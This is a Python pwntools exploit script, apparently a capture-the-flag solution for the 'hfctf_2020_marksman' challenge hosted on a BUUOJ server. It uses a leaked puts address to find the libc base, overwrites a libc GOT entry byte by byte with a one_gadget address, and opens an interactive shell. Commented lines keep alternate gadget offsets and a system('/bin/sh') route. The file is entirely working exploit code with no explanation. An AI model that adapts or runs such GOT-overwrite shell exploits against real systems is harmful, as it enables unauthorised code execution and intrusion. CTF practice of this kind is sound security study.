import sys
from pwn import *
from ctypes import *
from pwn_debug.pwn_debug import *
binary='hfctf_2020_marksman'
elf=ELF(binary)
pdbg=pwn_debug(binary)
pdbg.local("/lib/x86_64-linux-gnu/libc.so.6")
pdbg.debug("2.27")
pdbg.remote('node3.buuoj.cn',25090)
pdbg.context.log_level='debug'
while True :
	# try :
		if len(sys.argv)==1 :
			#io=pdbg.run("debug")
			io=pdbg.run("local")
			libc=pdbg.libc
			# one_gadgaet=[0x45216,0x4526a,0xf02a4,0xf1147]
			# one_gadgaet=[0x41602,0x41656,0xdef36]
		else :
			io=pdbg.run("remote")
			# libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
			libc=ELF('../../x64libc/libc.so.6')
			# one_gadgaet=[0x4f2c5,0x4f322,0x10a38c]
			one_gadgaet=[0x45216,0x4526a,0xf02a4,0xf1147]


		libc_got = 0x5f4038
		og_off  = 0xe569f  # r12==NULL | r14==NULL
		io.recvuntil('0x')
		libcbase=int(io.recvline(),16)-libc.sym['puts']

		got = libcbase+libc_got
		success('got'+hex(got))
		og = libcbase+og_off
		success('og'+hex(og))
		io.recvuntil('shoot!shoot!\n')
		io.sendline(str(got))
		io.recvuntil('biang!\n')
		io.sendline(p8(og&0xff))
		io.recvuntil('biang!\n')
		io.sendline(p8((og>>8)&0xff))
		io.recvuntil('biang!\n')
		io.sendline(p8((og>>16)&0xff))


		# libc_base=u64(io.recvuntil('\x7f')[-6:]+'\x00\x00')-libc.sym['__malloc_hook']-88-0x10
		# libc.address=libc_base
		# system_addr=libc.sym['system']
		# bin_sh_addr=libc.search('/bin/sh\x00').next()
		# success('libc_base:'+hex(libc_base))
		# pdbg.bp([])
		io.interactive()

	# except Exception as e:
	# 	io.close()
	# 	continue
	# else:
	# 	continue